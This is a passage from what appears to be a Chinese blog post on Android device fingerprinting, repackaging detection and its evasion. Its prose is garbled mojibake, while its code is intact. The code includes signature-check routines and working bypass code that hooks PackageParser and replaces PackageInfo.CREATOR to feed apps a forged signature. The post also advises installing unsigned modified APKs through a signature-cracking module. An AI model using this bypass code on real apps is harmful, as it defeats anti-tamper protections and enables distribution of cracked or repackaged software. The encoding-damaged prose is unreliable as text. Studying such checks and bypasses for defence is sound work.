ï¼Œç›´æ¥å¯¹<code>uname</code>ç³»ç»Ÿè°ƒç”¨å¤„ç†å³å¯ ã€‚è·å–æ–¹æ³•æ¯”å¦‚ï¼Œä¹Ÿå¯ä»¥ç›´æ¥svcè°ƒç”¨unameå‡½æ•° ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ ¹æ®å‘½ä»¤è¡Œ ï¼Œ</p><p>ä¿®æ”¹çš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨unameçš„afteré‡Œé¢ç›´æ¥å¯¹æ•°æ®è¿›è¡Œæ›¿æ¢å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h3 id="åŒ…åéšæœºè·¯å¾„"><a href="#åŒ…åéšæœºè·¯å¾„" class="headerlink" title="åŒ…åéšæœºè·¯å¾„"></a>åŒ…åéšæœºè·¯å¾„</h3><p><strong>è¿™ä¸ªæ˜¯ä¸€ä¸ªéå¸¸éå¸¸æ ¸å¿ƒçš„å­—æ®µï¼Œå°±æ˜¯&#x2F;data&#x2F;app&#x2F;éšæœºBase64è·¯å¾„&#x2F;base.apk</strong></p><p><strong>è¿™ä¸ªéšæœºè·¯å¾„å°±æ˜¯è®¾å¤‡æŒ‡çº¹ï¼Œæ¯”å¦‚ä¸€äº›å¤§å‚ä¼šç©ï¼Œè¯»å–ä½ å¾®ä¿¡çš„éšæœºè·¯å¾„ï¼Œè·å–å¾®ä¿¡çš„åŒ…ä¿¡æ¯ï¼Œç„¶åè·å–é‡Œé¢çš„éšæœºè·¯å¾„</strong></p><p><strong>æ¯”å¦‚å¾®ä¿¡ï¼Œå¿«æ‰‹ï¼Œäº¬ä¸œï¼Œæ·˜å®è¿™ç§éšæœºè·¯å¾„ ï¼Œä½œä¸ºæ ¸å¿ƒçš„å”¯ä¸€è®¾å¤‡æŒ‡çº¹ï¼Œåªè¦ä½ ä¸å¸è½½å¾®ä¿¡ï¼Œæˆ–è€…å…¶ä»–å¤§å‚apk ï¼Œä½ çš„è®¾å¤‡æŒ‡çº¹æ°¸è¿œä¸å‘ç”Ÿå˜åŒ–ï¼Œæ— è®ºä½ å¦‚ä½•ä¿®æ”¹ä»–è‡ªå·±Apké‡Œé¢çš„ä¿¡æ¯ï¼Œè·Ÿä»–éƒ½ä¸äº§ç”Ÿä»»ä½•å½±å“ ã€‚</strong></p><h3 id="ç³»ç»Ÿè´¦å·"><a href="#ç³»ç»Ÿè´¦å·" class="headerlink" title="ç³»ç»Ÿè´¦å·"></a>ç³»ç»Ÿè´¦å·</h3><p>ä¸€èˆ¬å°è¯•æ¯”å¦‚å°ç±³ä¹‹ç±»çš„ï¼Œç™»å…¥äº†æŒ‡å®šè´¦å·ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªè´¦å·çš„<code>id</code>ä¿¡æ¯ ï¼Œè¿™ä¸ªä¹Ÿéœ€è¦å¤„ç†ä¸€ä¸‹ ã€‚æœ€å¥½çš„åŠæ³•æ˜¯ä¸ç™»å…¥è´¦å· ã€‚</p><h2 id="ç¯å¢ƒæ£€æµ‹"><a href="#ç¯å¢ƒæ£€æµ‹" class="headerlink" title="ç¯å¢ƒæ£€æµ‹"></a>ç¯å¢ƒæ£€æµ‹</h2><p>æ£€æµ‹ç¯å¢ƒå¤§å¤šæ•°å›´ç»•Hunterçš„æºç æ£€æµ‹æ€è·¯å»å¤ç° ï¼Œå¾ˆå¤šéƒ½æ˜¯Hunterçš„æºç  ï¼Œå¾ˆå¤šä¹Ÿéƒ½æ˜¯è¡Œä¸šå†…æ²¡æœ‰å…¬å¼€çš„ä¸€äº›æ£€æµ‹æ€è·¯</p><h3 id="Apkç­¾å"><a href="#Apkç­¾å" class="headerlink" title="Apkç­¾å"></a>Apkç­¾å</h3><p>æåˆ°ç¯å¢ƒæ£€æµ‹ä¸å¾—ä¸è¯´çš„å°±æ˜¯<strong>Apké‡æ‰“åŒ…æ£€æµ‹</strong> ï¼Œç°åœ¨æ£€æµ‹æ–¹æ³•åƒå¥‡ç™¾æ€ªï¼Œæˆ‘è¿™è¾¹ä¹Ÿæ˜¯ä¸€ä¸€ç½—åˆ—ä¸€ä¸‹ï¼ŒæŠŠä¸€äº›å¯èƒ½å­˜åœ¨çš„é£é™©ç‚¹ï¼Œæ£€æµ‹å’Œç»•è¿‡çš„åŸç†è¯¦ç»†å™è¿°ä¸€ä¸‹ ã€‚</p><p><strong>æƒ³è¦ç»•è¿‡ç­¾åæ£€æµ‹æœ€å¥½çš„åŠæ³•æˆ–è€…è¯´æˆæœ¬æœ€ä½æœ‰æ•ˆçš„åŠæ³•å°±æ˜¯ä¿®æ”¹å®Œæ¯•ä»¥åä¸ç­¾åé…åˆæ ¸å¿ƒç ´è§£ç›´æ¥å®‰è£…ã€‚</strong></p><blockquote><p>æ ¸å¿ƒç ´è§£æ˜¯<code>lsp</code>çš„æ¨¡å—ï¼Œ<code>lsp</code>å•†åº—ç›´æ¥ä¸‹è½½ï¼Œ<code>Hook apk</code>çš„ç³»ç»Ÿç­¾åè§£ææ–¹æ³•ï¼Œç›´æ¥ç»•è¿‡ç­¾åæ£€æµ‹æµç¨‹ ï¼Œå·²å®ç°ä¸ç­¾åç›´æ¥å®‰è£…</p></blockquote><p>é¦–å…ˆå…ˆè¯´ä¸€ä¸‹å¤§å‚æˆ–è€…ä¸€äº›ä¼ä¸šå£³çš„æ£€æµ‹ç‚¹ï¼ŒJavaå±‚åŸºç¡€çš„è·å–ç­¾åçš„æ–¹æ³•è¿™å—å°±ä¸ä¸€ä¸€å™è¿°äº† ã€‚</p><h4 id="Nativeå±‚è·å–ç­¾åæ–¹æ³•"><a href="#Nativeå±‚è·å–ç­¾åæ–¹æ³•" class="headerlink" title="Nativeå±‚è·å–ç­¾åæ–¹æ³•"></a>Nativeå±‚è·å–ç­¾åæ–¹æ³•</h4><h4 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><p>è¿™å—ä»¥<code>Hunter</code>æºç å¼€å§‹ä»‹ç» </p><p>æ ¸å¿ƒå°±ä¸‰éƒ¨åˆ† ã€‚</p><ul><li><code>svc openat</code>è¯»apkï¼Œå»è§£æç­¾å ã€‚</li><li>æ£€æµ‹æ‰“å¼€çš„fdï¼Œå¯¹fdçš„è·¯å¾„è¿›è¡ŒåæŸ¥ï¼Œè¿™å—æœ‰ä¸ªç»†èŠ‚ <code>buff[len] = &#39;\0&#39;</code>; å°±æ˜¯åŠ è¿™ä¸ªï¼Œå¦‚æœæ”»å‡»è€…æ²¡ä¿®æ”¹<code>readlinkat</code>çš„è¿”å›å€¼ï¼Œå°±å¯ä»¥æ£€æµ‹å‡ºæ¥ ã€‚</li><li>æ£€æµ‹å®Œæ¯•è·¯å¾„ä»¥å<strong>å¯¹è¿™ä¸ªæ–‡ä»¶çš„æƒé™è¿›è¡ŒåæŸ¥</strong>ï¼Œæ­£å¸¸apkæ˜¯åœ¨ç³»ç»Ÿä¸‹çš„ï¼Œ<strong>æƒé™GIDå’ŒUIDåº”è¯¥æ˜¯1000</strong> ï¼Œå¦‚æœæ”»å‡»è€…å¿˜è®°ä¿®æ”¹æƒé™ä¹Ÿå¯ä»¥æ£€æµ‹å‡ºæ¥ ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">const char *path = getApkPath(env, context); // è·å–ç»å¯¹è·¯å¾„ </span><br><span class="line">//check svc apk sign</span><br><span class="line">const string &amp;string = checkSign(env, path).substr(0, 10); // æˆªå–ç­¾åå“ˆå¸Œå€¼çš„å‰10ä¸ªå­—ç¬¦</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;apk sign  &quot; &lt;&lt; string;</span><br><span class="line">if (string == Base64Utils::VTDecode(&quot;TFtCRU58UERAUQ==&quot;)) &#123; // Base64å˜ä½“</span><br><span class="line">    //check sign success,but maybe svc io hook</span><br><span class="line">    //check apk path</span><br><span class="line">    int fd = my_openat(AT_FDCWD, reinterpret_cast&lt;const char *&gt;(path),</span><br><span class="line">                       O_RDONLY | O_CLOEXEC,</span><br><span class="line">                       0640);</span><br><span class="line">    //check apk path</span><br><span class="line">    char buff[PATH_MAX] = &#123;0&#125;;</span><br><span class="line">    std::string fdPath(&quot;/proc/&quot;);</span><br><span class="line">    fdPath.append(to_string(getpid())).append(&quot;/fd/&quot;).append(to_string(fd));</span><br><span class="line">    long len = raw_syscall(__NR_readlinkat, AT_FDCWD, fdPath.c_str(), buff, PATH_MAX);</span><br><span class="line">    if (len &lt; 0) &#123;</span><br><span class="line">        return getItemData(env, &quot;APKç­¾åéªŒè¯å¤±è´¥&quot;,</span><br><span class="line">                           &quot;readlinkat error&quot;, true,</span><br><span class="line">                           RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">    &#125;</span><br><span class="line">    //æˆªæ–­,å¦‚æœæ”»å‡»è€…hookäº†readlinkat,åªä¿®æ”¹äº†å‚æ•°,æ²¡ä¿®æ”¹è¿”å›å€¼ä¹Ÿå¯ä»¥æ£€æµ‹å‡ºæ¥ã€‚</span><br><span class="line">    buff[len] = &#x27;\0&#x27;;</span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;check apk sign path &quot; &lt;&lt; buff;</span><br><span class="line">    if (my_strcmp(path, buff) == 0) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; &quot;check apk sign path success &quot;;</span><br><span class="line">        //start check memory&amp;location inode</span><br><span class="line">        struct stat statBuff = &#123;0&#125;;</span><br><span class="line">        long stat = raw_syscall(__NR_fstat, fd, &amp;statBuff);</span><br><span class="line">        if (stat &lt; 0) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign path fail __NR_fstat&lt;0&quot;;</span><br><span class="line">            return getItemData(env, &quot;APKç­¾åéªŒè¯å¤±è´¥&quot;,</span><br><span class="line">                               &quot;fstat error&quot;, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        //check uid&amp;gid (1000 = system group)</span><br><span class="line">        if (statBuff.st_uid != 1000 &amp;&amp; statBuff.st_gid != 1000) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign gid&amp;uid fail &quot;;</span><br><span class="line">            return getItemData(env, &quot;APKç­¾åéªŒè¯å¤±è´¥&quot;,</span><br><span class="line">                               nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        size_t inode = getFileInMapsInode(path);</span><br><span class="line">        if (statBuff.st_ino != inode) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;check apk sign inode fail &quot;&lt;&lt;statBuff.st_ino&lt;&lt;&quot; maps -&gt;&quot;&lt;&lt;inode;</span><br><span class="line">            return getItemData(env, &quot;APKç­¾åéªŒè¯å¤±è´¥&quot;,</span><br><span class="line">                               nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; check apk sign success! uid-&gt; &quot; &lt;&lt; statBuff.st_uid</span><br><span class="line">                   &lt;&lt; &quot; gid-&gt; &quot;</span><br><span class="line">                   &lt;&lt; statBuff.st_gid;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;check apk sign path fail &quot;;</span><br><span class="line">        return getItemData(env, &quot;APKç­¾åéªŒè¯å¤±è´¥&quot;,</span><br><span class="line">                           nullptr, true, RISK_LEAVE_DEADLY, TAG_REPACKAGE);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;check apk sign success&quot;;</span><br><span class="line"> </span><br><span class="line">    return nullptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Inode æ ¡éªŒæ£€æµ‹çš„ä¸æ˜¯å†…å­˜ä¸­çš„<strong>å†…å®¹</strong>æ˜¯å¦è¢«ä¿®æ”¹ï¼Œè€Œæ˜¯æ£€æµ‹å†…å­˜çš„<strong>æ¥æº</strong>æ˜¯å¦è¢«å·æ¢</p></blockquote><h4 id="å¯¹æŠ—"><a href="#å¯¹æŠ—" class="headerlink" title="å¯¹æŠ—"></a>å¯¹æŠ—</h4><p>é’ˆå¯¹ä¸Šé¢çš„æ£€æµ‹å¯¹æŠ—ä¹Ÿå¾ˆç®€å•ï¼Œå¯¹svcçš„<code>openat</code>æ‹¦æˆªäº†ä»¥åï¼Œå¯¹<code>readlinkat</code>å’Œ<code>stat</code>å‡½æ•°è¿›è¡Œå¤„ç†å³å¯ã€‚å¾ˆè½»æ¾å³å¯ç»•è¿‡æ£€æµ‹ã€‚å¾ˆå¤šåŠ å£³åŸºæœ¬éƒ½æ˜¯æ£€æµ‹<code>ROOT</code>æ£€æµ‹<code>LSP</code>è°ƒç”¨æ ˆä¹‹ç±»çš„ï¼Œå¹¶ä¸åªæ˜¯å•ä¸€çš„å»æ£€æµ‹ç­¾åä¸€ä¸ªçº¬åº¦ã€‚æ¯”å¦‚å‘ç°äº†å¼€å¯äº†<code>seccomp</code>å°±ä¼šé—ªé€€ï¼Œå‘ç°<code>Root</code>å°±ä¼šé—ªé€€ã€‚</p><h4 id="Javaå±‚è·å–ç­¾åæ–¹æ³•"><a href="#Javaå±‚è·å–ç­¾åæ–¹æ³•" class="headerlink" title="Javaå±‚è·å–ç­¾åæ–¹æ³•"></a>Javaå±‚è·å–ç­¾åæ–¹æ³•</h4><h4 id="æ£€æµ‹-1"><a href="#æ£€æµ‹-1" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><h5 id="æ£€æµ‹CREATORæ˜¯å¦è¢«æ›¿æ¢"><a href="#æ£€æµ‹CREATORæ˜¯å¦è¢«æ›¿æ¢" class="headerlink" title="æ£€æµ‹CREATORæ˜¯å¦è¢«æ›¿æ¢"></a>æ£€æµ‹CREATORæ˜¯å¦è¢«æ›¿æ¢</h5><p>è¿™é‡Œå…ˆè¯´ä¸€ä¸‹<code>Hunter</code>çš„<code>Java</code>å±‚æ£€æµ‹ç­¾åçš„æ–¹æ³•ï¼Œè¿™å—ç›¸å½“äºåå°„<code>CREATOR</code> å˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯ä¿å­˜ä¸€äº›<code>IPC</code>é€šè®¯çš„ä¸œè¥¿</p><p>å¾ˆå¤šæ”»å‡»è€…ä¼šç”¨<code>Lspatch</code>è¿›è¡Œæ‰“åŒ… ï¼Œå¯¹å˜é‡è¿›è¡Œæ›¿æ¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å»æ£€æµ‹è¿™ä¸ªå˜é‡çš„<code>Classloader</code>æ˜¯ä¸æ˜¯ç³»ç»Ÿ<code>ClassLoader</code></p><p>é˜²æ­¢è¢«æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Field creatorField = PackageInfo.class.getField(&quot;CREATOR&quot;);</span><br><span class="line">    creatorField.setAccessible(true);</span><br><span class="line">    Object creator = creatorField.get(null);</span><br><span class="line">    if (creator != null) &#123;</span><br><span class="line">        ClassLoader creatorClassloader = creator.getClass().getClassLoader();</span><br><span class="line">        ClassLoader sysClassloader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        if (creatorClassloader == null || sysClassloader == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // ç³»ç»Ÿçš„æ˜¯ bootclassloader</span><br><span class="line">        // ç”¨æˆ·åˆ›å»ºçš„éƒ½æ˜¯ pathclassloader</span><br><span class="line">        // å¦‚æœç›¸ç­‰åˆ™è®¤ä¸ºç³»ç»Ÿçš„è¢«æ›¿æ¢</span><br><span class="line">        if (sysClassloader.getClass().getName().</span><br><span class="line">                equals(creatorClassloader.getClass().getName())) &#123;</span><br><span class="line">            return new ListItemBean(&quot;Apkç­¾åéªŒè¯å¤±è´¥ï¼&quot;,</span><br><span class="line">                    ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                    &quot;Apkç­¾åæ–¹æ³•è¢«æ›¿æ¢!\n&quot;</span><br><span class="line">                            + creatorClassloader.getClass().getName() + &quot;\n&quot;</span><br><span class="line">                            + sysClassloader.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable e) &#123;</span><br><span class="line">    CLog.e(&quot;checkApkPackageInfoCreator error &quot; + e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static final Creator&lt;PackageInfo&gt; CREATOR</span><br></pre></td></tr></table></figure><p><code>Creator&lt;PackageInfo&gt;</code>æ˜¯è¯´æ˜è¿™æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»º<code>PackageInfo</code>ç±»å‹å¯¹è±¡çš„åˆ›å»ºå™¨</p></blockquote><p>æˆ‘ä»¬ä¹‹å‰åˆ†æ<code>Java å±‚ç›´æ¥ é€šè¿‡binderå’Œ AMS é€šè®¯è·å–çœŸå®ç­¾åä¿¡æ¯</code>è¿™ä¸ªçš„æ—¶å€™</p><p>æˆ‘ä»¬æ˜¯ä½¿ç”¨<code>getPackageInfo()</code>æ¥è·å–ç­¾åçš„ï¼Œå¦‚æœé€šè¿‡Javaåå°„æ‰¾åˆ°<code>PackageInfo.CREATOR</code>è¿™ä¸ªé™æ€å­—æ®µï¼Œç„¶åå°†è¿™ä¸ªå­—æ®µçš„å€¼æ›¿æ¢æˆè‡ªå·±ç¼–å†™çš„æ¶æ„<code>Creator</code>å®ç°ï¼Œå½“Appè°ƒç”¨<code>getPackageInfo()</code>è·å–ç­¾åæ—¶ï¼ŒAndroidç³»ç»Ÿå†…éƒ¨ä¼šä½¿ç”¨è¿™ä¸ªè¢«æ±¡æŸ“çš„<code>CREATOR</code>æ¥åˆ›å»º<code>PackageInfo</code>å¯¹è±¡ï¼Œæ¶æ„<code>Creator</code>åœ¨åˆ›å»ºå¯¹è±¡æ—¶ï¼Œå°†ç­¾åä¿¡æ¯ç¯¡æ”¹ä¸ºæ­£ç‰ˆçš„ç­¾åï¼Œä»è€Œç»•è¿‡Appçš„ç­¾åæ ¡éªŒ</p><p>è€Œè¿™ä¸ªæ£€æŸ¥çš„<strong>åŸç†</strong>æ˜¯ï¼šç³»ç»Ÿç±»çš„<code>Classloader</code>æ˜¯<code>BootClassloader</code>ï¼Œè€Œæˆ‘ä»¬å‘¢é€šè¿‡Hookæ¨¡å—çš„ä»£ç æ˜¯ç”±Appçš„<code>PathClassLoader</code>ï¼Œå› æ­¤åªéœ€è¦åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª<code>Classloader</code>æ­£ä¸æ­£ç¡®å³å¯</p><h4 id="å¯¹æŠ—-1"><a href="#å¯¹æŠ—-1" class="headerlink" title="å¯¹æŠ—"></a>å¯¹æŠ—</h4><p>å¯¹æŠ—çš„æ–¹æ³•ä¸»è¦ä¸‹é¢ä¸‰ç§ï¼š</p><p>ç°åœ¨å¤§å‚ä¸€èˆ¬ä¼šç›´æ¥é€šè¿‡IPCç›´æ¥å’ŒPMSè¿›è¡Œé€šè®¯ ï¼Œä¸è¿‡è¿™ç§æ€è·¯ä¹Ÿå¾ˆå¥½è¿‡ ï¼Œæˆ‘è¿™è¾¹ä¹Ÿæ˜¯å‚è€ƒçš„<code>Lspatch</code> </p><p>è¿™å—æœ‰ä¸¤ä¸ªå¾ˆæ ¸å¿ƒçš„æ€è·¯ ï¼Œå°±æ˜¯æ‹¦æˆª<code>Binder IPC</code>é€šè®¯çš„æ–¹æ³•ï¼Œå’Œ<code>Hook</code>æœåŠ¡ç«¯çš„ç­¾åè§£ææ–¹æ³• ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><h5 id="HookæœåŠ¡ç«¯è§£æç­¾åæ–¹æ³•"><a href="#HookæœåŠ¡ç«¯è§£æç­¾åæ–¹æ³•" class="headerlink" title="HookæœåŠ¡ç«¯è§£æç­¾åæ–¹æ³•"></a>HookæœåŠ¡ç«¯è§£æç­¾åæ–¹æ³•</h5><p>åœ¨ç³»ç»Ÿè¿›è¡Œç­¾åè§£æçš„æ—¶å€™è¿›è¡Œç­¾åæ›¿æ¢æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private static void hookPackageParser(Signature[] fakeSignature) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        RposedBridge.hookAllMethods(</span><br><span class="line">                RposedHelpers.findClass(&quot;android.content.pm.PackageParser&quot;, ClassLoader.getSystemClassLoader()),</span><br><span class="line">                &quot;generatePackageInfo&quot;, new RC_MethodHook() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    protected void afterHookedMethod(MethodHookParam param) &#123;</span><br><span class="line">                        PackageInfo packageInfo = (PackageInfo) param.getResult();</span><br><span class="line">                        if (packageInfo == null) return;</span><br><span class="line">                        if (packageInfo.packageName.equals(RuntimeToolKit.packageName)) &#123;</span><br><span class="line">                            if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123;</span><br><span class="line">                                CLog.i(&quot;PackageParser signature info (method 1)&quot;);</span><br><span class="line">                                packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                            &#125;</span><br><span class="line">                            if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                                if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                                    CLog.i(&quot;PackageParser signature info (method 2)&quot;);</span><br><span class="line">                                    Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                                    if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                                        signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;hook apkSign PackageParser -&gt; generatePackageInfo &quot; + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="æ›¿æ¢CREATOR"><a href="#æ›¿æ¢CREATOR" class="headerlink" title="æ›¿æ¢CREATOR"></a>æ›¿æ¢CREATOR</h5><p>è¿™ä¸ªæ€è·¯ä¹Ÿæ˜¯æŠ„çš„<code>lspatch</code> ï¼Œè¿™ç§æ€è·¯å¯ä»¥é€šè¿‡æ£€æµ‹<code>CREATOR</code> å˜é‡<code>Classloader</code>çš„æ–¹å¼æ£€æµ‹å‡ºæ¥ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static void byPassSignatureForCREATOR(Signature[] fakeSignature) &#123;</span><br><span class="line">    if (fakeSignature == null) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; originalCreator = PackageInfo.CREATOR;</span><br><span class="line">    Parcelable.Creator&lt;PackageInfo&gt; proxiedCreator = new Parcelable.Creator&lt;PackageInfo&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public PackageInfo createFromParcel(Parcel source) &#123;</span><br><span class="line">            PackageInfo packageInfo = originalCreator.createFromParcel(source);</span><br><span class="line">            if (packageInfo.packageName.equals(RuntimeToolKit.packageName)) &#123;</span><br><span class="line">                if (packageInfo.signatures != null &amp;&amp; packageInfo.signatures.length &gt; 0) &#123;</span><br><span class="line">                    //CLog.i(&quot;CREATOR Replace signature info (method 1)&quot;);</span><br><span class="line">                    packageInfo.signatures[0] = fakeSignature[0];</span><br><span class="line">                &#125;</span><br><span class="line">                if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">                    if (packageInfo.signingInfo != null) &#123;</span><br><span class="line">                        //CLog.i(&quot;CREATOR Replace signature info (method 2)&quot;);</span><br><span class="line">                        Signature[] signaturesArray = packageInfo.signingInfo.getApkContentsSigners();</span><br><span class="line">                        if (signaturesArray != null &amp;&amp; signaturesArray.length &gt; 0) &#123;</span><br><span class="line">                            signaturesArray[0] = fakeSignature[0];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return packageInfo;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        @Override</span><br><span class="line">        public PackageInfo[] newArray(int size) &#123;</span><br><span class="line">            return originalCreator.newArray(size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    RposedHelpers.setStaticObjectField(PackageInfo.class, &quot;CREATOR&quot;, proxiedCreator);</span><br><span class="line">    try &#123;</span><br><span class="line">        Map&lt;?, ?&gt; mCreators = (Map&lt;?, ?&gt;) RposedHelpers.getStaticObjectField(Parcel.class, &quot;mCreators&quot;);</span><br><span class="line">        mCreators.clear();</span><br><span class="line">    &#125; catch (NoSuchFieldError ignore) &#123;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;fail to clear Parcel.mCreators&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Map&lt;?, ?&gt; sPairedCreators = (Map&lt;?, ?&gt;)</span><br><span class="line">                RposedHelpers.getStaticObjectField(Parcel.class,</span><br><span class="line">                        &quot;sPairedCreators&quot;);</span><br><span class="line">        sPairedCreators.clear();</span><br><span class="line">    &#125; catch (NoSuchFieldError ignore) &#123;</span><br><span class="line">    